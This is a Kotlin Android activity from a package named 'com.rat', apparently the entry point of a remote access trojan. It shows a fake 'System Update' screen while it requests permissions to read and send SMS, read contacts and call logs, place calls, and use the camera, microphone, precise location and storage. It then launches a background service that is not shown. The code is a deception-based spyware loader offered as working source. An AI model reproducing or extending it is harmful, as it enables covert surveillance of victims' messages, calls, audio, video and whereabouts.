package com.rat

import android.app.Activity
import android.os.Build
import android.os.Bundle
import android.widget.TextView
import android.content.pm.PackageManager
import android.content.Intent

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val textView = TextView(this)
        textView.text = "System Update\n\nجاري التهيئة..."
        textView.textSize = 20f
        setContentView(textView)

        try {
            val permsList = mutableListOf(
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.POST_NOTIFICATIONS
            )
            
            if (Build.VERSION.SDK_INT >= 33) {
                permsList.add(android.Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                permsList.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                permsList.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }

            val missingPerms = permsList.filter {
                checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
            }.toTypedArray()

            if (missingPerms.isNotEmpty()) {
                requestPermissions(missingPerms, 100)
            }

            // تشغيل الخدمة
            val intent = Intent(this, MainService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
